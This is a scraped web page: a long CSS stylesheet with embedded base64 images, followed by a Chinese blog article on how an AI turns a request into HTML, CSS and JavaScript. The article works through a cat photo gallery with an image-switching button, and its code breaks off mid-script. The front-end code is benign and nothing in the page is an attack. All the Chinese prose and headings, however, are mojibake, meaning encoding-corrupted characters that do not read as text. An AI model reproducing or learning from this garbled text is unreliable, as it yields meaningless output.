20px;background-image:url("data:image/png;base64,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")}.markdown-body h2{position:relative;padding:0 0 0 20px;font-size:20px;font-weight:700;color:#614500}.markdown-body h2:before{content:"";position:absolute;top:3px;bottom:0;left:0;background-image:url("data:image/png;base64,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");background-size:100% 100%;background-repeat:no-repeat;width:15px;height:15px;margin:auto}.markdown-body h3{width:100%;text-align:left;margin:20px 10px 0 0;font-size:18px;font-weight:700;display:inline-block;padding-left:10px;padding-bottom:0;border-left:5px solid #8f6600;color:#614500}.markdown-body h4,.markdown-body h5,.markdown-body h6{font-weight:700;color:#a37400}.markdown-body h4{font-size:17px}.markdown-body h5,.markdown-body h6{display:flex;align-items:center}.markdown-body h5:after,.markdown-body h6:after{display:inline-block;border:2px solid #fff6e0;color:rgba(189,134,0,.5);border-radius:50%;text-align:center;margin-left:5px}.markdown-body h5{font-size:14px}.markdown-body h5:after{content:"5";width:15px;height:15px;line-height:15px;font-size:13px}.markdown-body h6{font-size:12px}.markdown-body h6:after{content:"6";width:13px;height:13px;line-height:13px;font-size:12px}.markdown-body p{color:#412c0c;letter-spacing:1px;font-weight:400;margin-bottom:16px}.markdown-body img{max-width:100%;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#755300;font-weight:400;border-bottom:1px solid #755300;font-weight:bolder;text-decoration:none}.markdown-body table{width:100%!important;margin:0;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border-spacing:0}.markdown-body table img{box-shadow:none}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body thead tr th{text-align:center}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;box-sizing:border-box;border:1px solid rgba(72,42,10,.1)}.markdown-body blockquote{position:relative;text-size-adjust:100%;line-height:25px;font-weight:400;border-radius:10px;font-style:normal;text-align:left;box-sizing:inherit;border:1px solid #ffd87a;background-color:rgba(189,134,0,.5);margin:20px 0;padding:20px}.markdown-body blockquote p{color:#fff6e0;letter-spacing:2px;margin:0}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;color:#cc9100;font-size:34px;font-weight:700}.markdown-body blockquote:before{content:"â";top:8px;left:5px}.markdown-body blockquote:after{content:"â";right:5px;bottom:-5px}.markdown-body strong{color:#c28a00;font-weight:bolder}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{color:#c28a00}.markdown-body em strong{font-style:normal;color:#c28a00;background-color:#8a6200}.markdown-body s{color:#c28a00}.markdown-body hr{border-top:1px solid #805b00}.markdown-body code,.markdown-body li code,.markdown-body p code{color:#996d00;background-color:rgba(130,98,0,.3)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#858585;font-family:bold;letter-spacing:1px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection,.markdown-body img::selection{color:rgba(189,134,0,.5);background-color:#fff}.markdown-body a::selection,.markdown-body b::selection,.markdown-body del::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:transparent}.markdown-body pre&gt;code::selection{background-color:rgba(189,134,0,.5)}.markdown-body .math .math-inline::selection,.markdown-body blockquote::selection,.markdown-body ol::selection,.markdown-body p::selection,.markdown-body strong::selection,.markdown-body table::selection,.markdown-body ul::selection{background-color:rgba(189,134,0,.5)}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸ§  ç¬¬ä¸€å¹•ï¼šAIè„‘è¢‹é‡Œçš„â€œç®—ç›˜â€æ˜¯æ€ä¹ˆæ‰“çš„ï¼Ÿ</h2>
<p>æƒ³è±¡ä¸€ä¸ª AI ååœ¨ç”µè„‘å‰ï¼ˆå½“ç„¶ï¼Œå®ƒå¹¶æ²¡æœ‰æ¤…å­ï¼Œä¹Ÿæ²¡æœ‰å’–å•¡ â˜•ï¼‰ï¼Œå®ƒé¢å¯¹ä¸€ä¸ªäººç±»çš„è¯·æ±‚ï¼š</p>
<blockquote>
<p>â€œè¯·å¸®æˆ‘å†™ä¸€ä¸ªå“åº”å¼çš„ç½‘é¡µï¼Œèƒ½å±•ç¤ºçŒ«å’ªçš„ç…§ç‰‡ï¼Œè¿˜è¦æœ‰æŒ‰é’®åˆ‡æ¢ã€‚â€</p>
</blockquote>
<p>å¯¹äºä½ æˆ‘ï¼Œè¿™æ˜¯ä¸ªç¼–ç ä»»åŠ¡ï¼›<br/>
å¯¹äº AIï¼Œè¿™æ˜¯ä¸€ä¸ª<strong>è¯­è¨€ç†è§£ + é€»è¾‘æ¨ç† + ç”Ÿæˆä»£ç </strong>çš„è¿‡ç¨‹ã€‚</p>
<p>åº•å±‚å…¶å®åˆ†æˆä¸‰æ­¥èµ°ï¼š</p>
<ol>
<li>
<p><strong>è¯­ä¹‰ç†è§£ï¼ˆSemantic Understandingï¼‰</strong><br/>
AI é¦–å…ˆå¾—æ˜ç™½â€œå±•ç¤ºçŒ«å’ªçš„ç…§ç‰‡â€è¿™å¥è¯çš„æ„æ€ã€‚è¿™ä¸€æ­¥ç›¸å½“äºå®ƒåœ¨è„‘ä¸­ç”Ÿæˆä¸€ä¸ªæŠ½è±¡çš„ç½‘é¡µç»“æ„æ ‘ï¼ˆæœ‰ç‚¹ç±»ä¼¼ DOMï¼Œä½†æ˜¯æ˜¯è„‘å†…çš„ï¼‰ã€‚</p>
</li>
<li>
<p><strong>æ¨¡å¼æœç´¢ï¼ˆPattern Matchingï¼‰</strong><br/>
æ¥ç€å®ƒä¼šåœ¨è®°å¿†ä¸­æœç´¢â€œç½‘é¡µâ€ã€â€œå“åº”å¼â€ã€â€œæŒ‰é’®â€ç­‰çš„æœ€ä½³å®ç°æ–¹å¼ã€‚æ¢å¥è¯è¯´ï¼Œå®ƒåœ¨æ€è€ƒï¼š</p>
<blockquote>
<p>â€œå—¯ï¼Œæˆ‘ä»¥å‰çœ‹è¿‡è¿™ç§å†™æ³•ï¼Œå¤§æ¦‚ HTML è¦ä¸€å±‚å®¹å™¨ï¼Œä¸€ä¸ª <code>img</code>ï¼Œå†åŠ ä¸€ä¸ª <code>button</code> æ¥åˆ‡æ¢å›¾ç‰‡ã€‚â€</p>
</blockquote>
</li>
<li>
<p><strong>ä»£ç ç”Ÿæˆï¼ˆCode Generationï¼‰</strong><br/>
å½“é€»è¾‘ç»“æ„æ•²å®šï¼ŒAI å°±å¼€å§‹â€œæ•²é”®ç›˜â€â€”â€”å‡†ç¡®æ¥è¯´ï¼Œæ˜¯åœ¨è¯­è¨€æ¨¡å‹çš„æ¦‚ç‡åˆ†å¸ƒé‡Œï¼Œé€è¯é¢„æµ‹å‡ºæ­£ç¡®çš„ HTMLã€CSS å’Œ JavaScriptã€‚</p>
</li>
</ol>
<p>ğŸ·è¿™å°±åƒå³å…´çˆµå£«ï¼šæ²¡æœ‰å›ºå®šçš„è°±å­ï¼Œä½†æ¯ä¸ªéŸ³ç¬¦éƒ½â€œåˆç†â€ã€‚</p>
<hr/>
<h2 data-id="heading-1">ğŸ’¡ ç¬¬äºŒå¹•ï¼šAI æ˜¯æ€ä¹ˆç¼–ç»‡ HTML é‚£å¼ â€œè››ç½‘â€çš„</h2>
<p>HTMLï¼ˆè¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ï¼‰å…¶å®æ˜¯æœ€åƒâ€œè¯—â€çš„ç¨‹åºè¯­è¨€ã€‚<br/>
AI åœ¨ç”Ÿæˆ HTML æ—¶ï¼Œå¹¶ä¸æ˜¯æ­»è®°ç¡¬èƒŒæ¨¡æ¿ï¼Œè€Œæ˜¯åœ¨<strong>æ­å»ºè¯­ä¹‰ç»“æ„</strong>ã€‚</p>
<p>AI æƒ³çš„é€»è¾‘å¤§è‡´å¦‚ä¸‹ï¼ˆä¼ªæ€ç»´æ¨¡å¼ğŸ’­ï¼‰ï¼š</p>
<pre><code class="hljs language-css" lang="css">æˆ‘éœ€è¦ä¸€ä¸ªç½‘é¡µ
â”‚
â”œâ”€â”€ é¡¶éƒ¨ï¼šæ ‡é¢˜åŒºåŸŸ &lt;<span class="hljs-selector-tag">header</span>&gt;
â”‚
â”œâ”€â”€ ä¸­é—´ï¼šå±•ç¤ºå†…å®¹ &lt;<span class="hljs-selector-tag">main</span>&gt;
â”‚    â”‚
â”‚    â”œâ”€â”€ å›¾ç‰‡å®¹å™¨ &lt;<span class="hljs-selector-tag">div</span>&gt;
â”‚    â””â”€â”€ æŒ‰é’®åŒºåŸŸ &lt;<span class="hljs-selector-tag">button</span>&gt;
â”‚
â””â”€â”€ åº•éƒ¨ï¼šç‰ˆæƒä¿¡æ¯ &lt;<span class="hljs-selector-tag">footer</span>&gt;
</code></pre>
<p>ç„¶åï¼Œå®ƒä¼šæ ¹æ®ä¸Šä¸‹æ–‡è¡¥å……å¿…è¦çš„å±æ€§ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>â€œå“åº”å¼â€ â†’ åŠ å…¥ <code>meta viewport</code></li>
<li>â€œåˆ‡æ¢å›¾ç‰‡â€ â†’ å‡†å¤‡æŒ‰é’®å’Œ JS è„šæœ¬</li>
<li>â€œçŒ«å’ªâ€ â†’ åŠ è½½ä¸€å¼ å¯çˆ±çš„ç¤ºä¾‹å›¾ç‰‡ ğŸ±</li>
</ul>
<p>äºæ˜¯ï¼ŒAI ç”Ÿæˆçš„ HTML å°±åƒä¸‹é¢è¿™æ ·ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>AIçš„çŒ«å’ªç”»å»Š<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
    <span class="hljs-selector-tag">body</span> {
      <span class="hljs-attribute">font-family</span>: sans-serif;
      <span class="hljs-attribute">text-align</span>: center;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">2rem</span>;
      <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(to bottom, <span class="hljs-number">#ffe6f2</span>, <span class="hljs-number">#fff</span>);
    }
    <span class="hljs-selector-tag">img</span> {
      <span class="hljs-attribute">max-width</span>: <span class="hljs-number">90%</span>;
      <span class="hljs-attribute">height</span>: auto;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>;
      <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">10px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>);
    }
    <span class="hljs-selector-tag">button</span> {
      <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">1rem</span>;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">0.6rem</span> <span class="hljs-number">1.2rem</span>;
      <span class="hljs-attribute">border</span>: none;
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ff99cc</span>;
      <span class="hljs-attribute">color</span>: white;
      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1rem</span>;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
      <span class="hljs-attribute">cursor</span>: pointer;
    }
    <span class="hljs-selector-tag">button</span><span class="hljs-selector-pseudo">:hover</span> {
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ff6699</span>;
    }
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>ğŸ¾ æ¬¢è¿æ¥åˆ° AI çš„çŒ«å’ªç”»å»Š<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"catImg"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://placekitten.com/400/300"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"Cute cat"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"changeBtn"</span>&gt;</span>æ¢ä¸€åªçŒ«ğŸ±<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-keyword">const</span> catImg = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'catImg'</span>);
    <span class="hljs-keyword">const</span> changeBtn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'changeBtn'</span>);
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">getRandomCat</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">const</span> w = <span class="hljs-number">300</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">200</span>);
      <span class="hljs-keyword">const</span> h = <span class="hljs-number">200</span> + <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">200</span>);
